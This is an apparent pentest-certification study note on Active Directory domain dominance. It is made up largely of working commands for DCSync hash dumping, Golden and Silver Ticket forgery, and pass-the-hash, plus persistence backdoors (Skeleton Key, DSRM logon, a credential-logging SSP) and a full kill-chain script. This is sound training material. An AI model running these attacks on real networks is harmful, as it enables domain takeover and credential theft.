---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, dcsync, golden-ticket, domain-dominance]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.4 — Domain Dominance"]
netgod-refs: []
---

# S3-09 — DCSync and Domain Dominance

> [!info] Relationship to PHANTOM
> Full domain dominance content exists in [[PHANTOM/MODULE 4 — Active Directory/04.4 — Domain Dominance]]. This note covers PNPT/OSCP exam context, exact commands for DCSync and Golden/Silver tickets, and post-DA objectives.

---

## What Domain Dominance Means

Domain dominance is the point where you control the domain — not just one machine, not just one admin account, but the entire AD infrastructure. The key milestone is:

**Getting the krbtgt hash.**

The `krbtgt` account's NT hash is the master key of the Kerberos infrastructure. With it, you can forge Kerberos tickets for any user, any service, with any group memberships, that last indefinitely. This is called a **Golden Ticket** — and it's permanent unless the krbtgt password is rotated twice.

**Domain dominance milestones in order:**
1. Domain Admin credentials (or equivalent)
2. DCSync → all domain hashes including krbtgt
3. Golden Ticket creation → persistence and future access
4. Proof collection (flags from DC and other machines)

---

## DCSync — Replicating All Domain Hashes

### What DCSync Is

Domain Controllers replicate AD changes between themselves using the **Directory Replication Service (DRS)** protocol. Any DC can request a replication update from another DC — this is how changes propagate across multiple DCs in large environments.

DCSync simulates this replication request from an attacker machine. By presenting the correct replication rights, the attacker tricks the DC into sending password hashes for all (or specific) domain users — as if it were another DC asking for a sync.

**This never touches LSASS.** It's purely a network-based attack using legitimate AD protocols. No code runs on the DC — you just receive data it willingly sends as part of normal replication.

### Permissions Required for DCSync

The following rights on the **domain root object** allow DCSync:
- `DS-Replication-Get-Changes` (GetChanges)
- `DS-Replication-Get-Changes-All` (GetChangesAll)
- `DS-Replication-Get-Changes-In-Filtered-Set` (for certain sensitive attributes)

**Who has these by default:**
- Domain Admins
- Enterprise Admins
- Domain Controllers (computer accounts)
- Administrators group

**Who can be granted these rights:**
- Any user/group — if someone with WriteDACL on the domain root grants them (see S3-08)

---

### Executing DCSync — impacket-secretsdump (Kali)

```bash
# Dump all domain hashes (most common — what you run first):
impacket-secretsdump domain/Administrator:password@DC_IP

# With NT hash (PTH):
impacket-secretsdump domain/Administrator@DC_IP -hashes :NTLM_HASH

# Dump specific users only (quieter):
impacket-secretsdump domain/Administrator:password@DC_IP -just-dc-user krbtgt
impacket-secretsdump domain/Administrator:password@DC_IP -just-dc-user Administrator
impacket-secretsdump domain/Administrator:password@DC_IP -just-dc-user jsmith

# Just DC hashes (no LSA secrets, no cached credentials — faster):
impacket-secretsdump domain/Administrator:password@DC_IP -just-dc

# Full dump including LSA secrets, cached credentials, machine accounts:
impacket-secretsdump domain/Administrator:password@DC_IP

# Output format options:
# Default: username:rid:LM_hash:NT_hash:::
# With -outputfile: saves to files automatically
impacket-secretsdump domain/Administrator:password@DC_IP -outputfile /tmp/domain_hashes
```

**Full secretsdump output breakdown:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
jsmith:1104:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:AAAA...
krbtgt:aes128-cts-hmac-sha1-96:BBBB...
Administrator:aes256-cts-hmac-sha1-96:CCCC...

[*] Cleaning up...
```

**Fields:** `username:RID:LM_hash:NT_hash:::`
- RID 500 = built-in Administrator
- RID 501 = built-in Guest
- RID 502 = krbtgt (most valuable)
- RID 1000+ = regular accounts

**The krbtgt hash is what you want most.** Extract it:
```bash
grep "^krbtgt:" domain_hashes.txt
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
#                                               └── This is the NT hash — copy it
```

---

### Executing DCSync — Mimikatz (Windows)

```cmd
# In a mimikatz session with DA rights:
privilege::debug
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /all /csv    # All users in CSV format

# Output for krbtgt:
# Object RDN           : krbtgt
# ** SAM ACCOUNT **
# SAM Username         : krbtgt
# Hash NTLM: 1693c6cefafffc7af11ef34d1c788f47
# ntlm- 0: 1693c6cefafffc7af11ef34d1c788f47
# Hash NTLM: 1693c6cefafffc7af11ef34d1c788f47
```

---

### What to Do With the Hashes

**Immediate:** Pass-the-Hash to everything

```bash
# Access any machine in the domain as Administrator:
crackmapexec smb 192.168.0.0/24 -u Administrator -H ADMIN_NT_HASH --continue-on-success
impacket-psexec domain/Administrator@TARGET -hashes :ADMIN_NT_HASH
evil-winrm -i TARGET -u Administrator -H ADMIN_NT_HASH

# Access the DC itself:
impacket-psexec domain/Administrator@DC_IP -hashes :ADMIN_NT_HASH
```

**Strategic:** Create Golden Ticket for persistence

---

## Golden Ticket — Forging TGTs with the krbtgt Hash

### What a Golden Ticket Is

A Golden Ticket is a **forged Kerberos TGT** — crafted from scratch using the krbtgt NT hash. Because the KDC uses the krbtgt hash to encrypt/sign TGTs, and you now have that hash, you can create a ticket for any user, with any group memberships, that the KDC will accept as valid.

**What makes it "golden":**
- Valid for any user in the domain — including non-existent users
- Can include any group memberships — including Domain Admins even for a standard user
- Default lifetime: 10 years (configurable)
- Survives password changes — the krbtgt hash is what matters, not the user's password
- Only invalidated by resetting the krbtgt password **twice** (once invalidates old tickets, second rotation required because DCs cache the previous password)

### Creating a Golden Ticket — Mimikatz (Windows)

```cmd
# Requirements:
# - krbtgt NT hash
# - Domain name
# - Domain SID

# Get the domain SID (if you don't already have it):
Get-DomainSID    # PowerView
whoami /user     # Shows your SID — remove last -XXXX for domain SID
# Or from secretsdump output — the SID is included

# Create Golden Ticket in mimikatz:
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /user:Administrator /ptt

# Flags:
# /domain    = domain FQDN
# /sid       = domain SID (NOT including the -500 RID at the end)
# /krbtgt    = krbtgt NT hash
# /user      = username to impersonate (can be anything — real or fake)
# /ptt       = pass-the-ticket (inject directly into current session)
# /id        = user RID (default 500 = Administrator)
# /groups    = comma-separated group RIDs (default includes DA: 512,513,518,519,520)
# /ticket    = save to file instead of injecting (/ticket:golden.kirbi)
# /startoffset = start time offset in minutes (default: -10)
# /endin     = ticket validity in minutes (default: 600 = 10 hours)
# /renewmax  = max renewal in minutes (default: 10080 = 7 days)

# Golden Ticket that lasts 10 years:
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:HASH /user:FakeAdmin /id:500 /groups:512 /endin:5256000 /renewmax:5256000 /ptt

# Verify ticket is loaded:
klist
```

### Creating a Golden Ticket — impacket (Kali)

```bash
# ticketer.py creates the ticket:
impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-XXXX-XXXX-XXXX -domain domain.local Administrator
# Output: Administrator.ccache

# Use the ticket:
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local
impacket-wmiexec -k -no-pass domain.local/Administrator@TARGET.domain.local
impacket-secretsdump -k -no-pass domain.local/Administrator@dc01.domain.local

# Golden Ticket with extra group SIDs (add to DA and EA):
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local \
  -groups 512,513,518,519,520 Administrator
```

### Creating a Golden Ticket — Rubeus (Windows)

```powershell
# Create Golden Ticket and inject:
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt

# With AES key (more stealthy — doesn't downgrade to RC4):
.\Rubeus.exe golden /aes256:AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt

# AES key from mimikatz:
# lsadump::dcsync /user:krbtgt
# Look for: Key List: aes256_hmac AAAA...
```

### Using a Golden Ticket

After injecting with `/ptt` or `export KRB5CCNAME`:

```bash
# Access any machine as the impersonated user:
dir \\DC01\C$
psexec.exe \\DC01 cmd.exe
# Or from Kali:
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local

# Verify ticket is active:
klist    # Shows the golden ticket in your session
```

---

## Silver Ticket — Forged TGS for Specific Services

### What a Silver Ticket Is

A **Silver Ticket** is a forged **TGS** (service ticket) — not a TGT. Instead of using the krbtgt hash, it uses the **service account's** NT hash.

**Key differences from Golden Ticket:**

| | Golden Ticket | Silver Ticket |
|--|--------------|--------------|
| Hash needed | krbtgt NT hash | Service account NT hash |
| Scope | Any service in domain | Only the specific service |
| KDC contact | None — TGT needed for KDC | **None — no DC contact at all** |
| Detectability | KDC logs TGT issuance | **No KDC contact → no logs** |
| Lifetime | Very long | Service-defined |
| Use case | Persistent domain access | Stealthy access to one service |

**Why no KDC contact makes Silver Tickets stealthier:**
When you present a Silver Ticket to a service, the service decrypts it with its own key and validates it locally — it never contacts the DC. This means no Kerberos event logs on the DC for this authentication.

### Creating a Silver Ticket — Mimikatz

```cmd
# Requirements:
# - Service account NT hash (from secretsdump)
# - Domain SID
# - Service SPN
# - Machine account name (for CIFS/HOST tickets)

# Silver Ticket for CIFS (file access) on DC:
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /target:DC01.domain.local /service:cifs /rc4:MACHINE_ACCOUNT_NTLM_HASH /user:Administrator /ptt

# Silver Ticket for HTTP (web service):
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /target:webserver.domain.local /service:http /rc4:SVC_WEB_NTLM_HASH /user:Administrator /ptt

# Silver Ticket for WinRM (WSMAN):
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /target:TARGET.domain.local /service:wsman /rc4:MACHINE_NTLM_HASH /user:Administrator /ptt

# Silver Ticket for MSSQL:
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /target:sqlserver.domain.local /service:MSSQLSvc /rc4:SVC_MSSQL_HASH /user:Administrator /ptt

# Common service names:
# cifs    = SMB file access
# host    = Scheduled tasks, WMI, services
# http    = Web services, WinRM (HTTP)
# wsman   = WinRM
# rpcss   = RPC/DCOM
# ldap    = LDAP queries
# MSSQLSvc = SQL Server
```

### Silver Ticket from Kali — impacket

```bash
impacket-ticketer -nthash SERVICE_ACCOUNT_HASH -domain-sid S-1-5-21-XXXX -domain domain.local -spn cifs/DC01.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass domain.local/Administrator@DC01.domain.local
```

---

## Collecting Proof — OSCP Flags on AD Set

After compromising the DC, collect your flags immediately:

```cmd
REM On DC (via psexec/evil-winrm):
type C:\Users\Administrator\Desktop\root.txt
hostname
whoami

REM Proof screenshot: hostname + whoami (NT AUTHORITY\SYSTEM or Administrator) + cat root.txt
```

**Also collect flags from Client and Server if you haven't already:**
```cmd
REM On Client machine:
type C:\Users\username\Desktop\user.txt

REM On Server machine:
type C:\Users\Administrator\Desktop\root.txt
```

**The OSCP AD all-or-nothing rule:** You need all three machines (Client + Server + DC) for the 40 points. If you have DA access, make sure you have flags from all three.

---

## Post-DA Objectives — What Else to Do

### Skeleton Key (Persistence — Real Engagements)

Skeleton Key patches the DC's LSASS to accept a master password for any account, while the real password continues to work.

```cmd
# In mimikatz on DC (requires DA):
misc::skeleton
# Now any account can authenticate with password "mimikatz"
```

> [!danger] Skeleton Key crashes on patched DCs
> This is a memory patch that can cause instability. Not recommended on OSCP. Documented here for awareness.

### DSRM Password — DC Local Admin Backdoor

Every DC has a Directory Services Restore Mode (DSRM) account — a local admin account used for AD recovery. By default it can't be used to log in remotely, but you can change that:

```cmd
# In mimikatz — get DSRM password hash:
lsadump::sam    # On DC — shows DSRM (Administrator local account) hash

# Enable remote login with DSRM account:
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Now PTH with DSRM hash persists even if DA password changes:
impacket-psexec ./Administrator@DC_IP -hashes :DSRM_HASH
```

### Custom SSP (Security Support Provider) — Credential Harvesting Persistence

SSPs hook into Windows authentication — every credential that flows through Windows is passed to registered SSPs.

```cmd
# In mimikatz:
misc::memssp
# Logs all authentication credentials to C:\Windows\system32\mimilsa.log
```

> [!info] Post-DA techniques for PNPT/CPTS
> These persistence techniques are covered in TCM Security's PEH course and in CPTS. For OSCP, your only objective is getting the proof files — you don't need persistence.

---

## The Complete PNPT AD Kill Chain — End to End

This is the full attack chain from zero to domain dominance:

```bash
# PHASE 1 — Initial Access (no creds)
# ====================================
# Option A: LLMNR/NBT-NS Poisoning
sudo responder -I eth0 -dwv
# Capture NTLMv2 → hashcat -m 5600 → get creds

# Option B: Relay Attack
crackmapexec smb 192.168.0.0/24 --gen-relay-list targets.txt
# Edit Responder.conf: SMB=Off, HTTP=Off
impacket-ntlmrelayx -tf targets.txt -smb2support &
sudo responder -I eth0 -dwv
# Get SAM dump → NT hashes → PTH

# Option C: Password Spray
enum4linux -P DC_IP    # Get password policy
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1'

# PHASE 2 — Enumeration (have one set of domain creds)
# ====================================================
bloodhound-python -u user -p pass -d domain.local -ns DC_IP --zip -c All
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request -outputfile tgs.txt
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request -outputfile asrep.txt
crackmapexec smb DC_IP -u user -p pass --users --groups --shares --pass-pol -M gpp_password

# PHASE 3 — Privilege Attacks
# ============================
# Kerberoasting:
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule
# AS-REP Roasting:
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
# BloodHound path → ACL abuse → password reset → add to DA group

# PHASE 4 — Lateral Movement
# ============================
crackmapexec smb 192.168.0.0/24 -u cracked_user -p cracked_pass --continue-on-success
evil-winrm -i TARGET -u cracked_user -p cracked_pass
impacket-psexec domain/cracked_user:cracked_pass@TARGET

# PHASE 5 — Domain Dominance
# ============================
# From DA account:
impacket-secretsdump domain/Administrator:pass@DC_IP
# Extract krbtgt hash

# Golden Ticket:
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local

# PHASE 6 — Proof Collection
# ============================
# Get flags from all machines
# Take proof screenshots (hostname + whoami + flag in one image)
```

---

## OSCP AD Set — Exam Strategy

**The 40-point all-or-nothing structure changes your strategy:**

```
Hours 1-4 of exam: Prioritise AD set
→ If you compromise Client but can't get Server: 0 points so far
→ Better to get 2 standalones (40 points) than 2/3 AD machines (0 points)

Decision point at hour 4:
→ If you're stuck on Client → Server pivot: switch to standalones, return later
→ If you have Client + have a path to Server: push to DA before switching

Time allocation (40 points vs 60 points from standalones):
→ 3 standalones = 60 pts (pass at 70 requires 10 more = partial AD)
→ 2 standalones + full AD = 80 pts (comfortable pass)
→ Best strategy: attempt AD first 3-4 hours, switch to standalones, return to AD
```

---

## Quick Reference

```bash
# DCSync (impacket):
impacket-secretsdump domain/Administrator:pass@DC_IP
impacket-secretsdump domain/Administrator@DC_IP -hashes :NTLM_HASH
impacket-secretsdump domain/Administrator:pass@DC_IP -just-dc-user krbtgt

# DCSync (mimikatz):
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# Get domain SID:
Get-DomainSID    # PowerView
impacket-getPac domain/user:pass -dc-ip DC_IP    # Extract from PAC

# Golden Ticket (impacket):
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local

# Golden Ticket (mimikatz):
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:HASH /user:Administrator /ptt

# Silver Ticket (mimikatz):
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /target:DC01.domain.local /service:cifs /rc4:MACHINE_HASH /user:Administrator /ptt

# Verify ticket:
klist

# Use Golden Ticket from Kali:
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local
impacket-wmiexec -k -no-pass domain.local/Administrator@TARGET.domain.local
impacket-secretsdump -k -no-pass domain.local/Administrator@DC_IP

# PTH to everywhere after DCSync:
crackmapexec smb 192.168.0.0/24 -u Administrator -H ADMIN_HASH --continue-on-success
```

---

## Common Mistakes

> [!warning] Domain dominance mistakes
> 1. **Using IP instead of hostname for Golden Ticket operations.** Kerberos tickets are bound to SPNs which use hostnames. `impacket-psexec -k` with an IP will fail. Always use `dc01.domain.local` — add to `/etc/hosts` if needed.
> 2. **Forgetting to extract the domain SID.** The domain SID is required for Golden and Silver tickets. Get it from `whoami /user` (strip the last `-XXXX`), from BloodHound (node properties), or from secretsdump output.
> 3. **Only grabbing the Administrator hash and ignoring krbtgt.** The Administrator hash is useful now — the krbtgt hash is useful forever. Always grab krbtgt immediately after DCSync.
> 4. **Not collecting flags from all three AD machines before the exam ends.** You need Client + Server + DC flags for 40 points. If you DA and only collect DC flag, you may miss the others. Be systematic — collect all proof immediately.
> 5. **Trying to DCSync with insufficient rights.** If secretsdump fails with "Access Denied", you don't have GetChangesAll rights. You need actual DA, or you need to grant yourself DCSync via WriteDACL first (S3-08).
> 6. **Not rotating credentials after ACL abuse.** If you reset a user's password to gain access and don't document the original hash, you can't restore the account. In OSCP this doesn't matter, but note it for real engagements.

---

## Stage 3 Complete — What You Now Have

All 9 Stage 3 (PNPT) notes are written:

| Note | Topic |
|------|-------|
| S3-01 | Active Directory Architecture |
| S3-02 | NTLM Authentication and Relay Attacks |
| S3-03 | Active Directory Enumeration |
| S3-04 | AS-REP Roasting |
| S3-05 | Kerberoasting |
| S3-06 | Password Spraying Active Directory |
| S3-07 | Pass-the-Hash and Pass-the-Ticket |
| S3-08 | ACL Abuse |
| S3-09 | DCSync and Domain Dominance |

**The full AD kill chain is now documented.** From zero credentials to Golden Ticket, every step has exact commands.

**What to do now:**
- Work through HTB: Forest, Active, Sauna, Support — the four canonical AD machines
- Practice the full chain in a home lab (Windows Server 2019 DC + Windows 10 client)
- Type `STAGE 4` for HTB Machine Methodology notes, or `NEXT` for Stage 4 content

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| HTB — Forest | DCSync chain — full path from AS-REP to DA to all hashes |
| HTB — Active | Kerberoasting → DA → DCSync |
| HTB — Sauna | AS-REP → BloodHound → DCSync → Golden Ticket |
| HTB — Monteverde | Password in AD attribute → lateral → DCSync |
| TCM Security — PEH Course | Full domain dominance demo with mimikatz |
| TryHackMe — "Post-Compromise AD Attacks" | DCSync, Pass-the-Ticket, Golden Ticket labs |
| impacket secretsdump | `impacket-secretsdump -h` — read all flags and options |
| [[PHANTOM/MODULE 4 — Active Directory/04.4 — Domain Dominance]] | Full technical depth in PHANTOM vault |
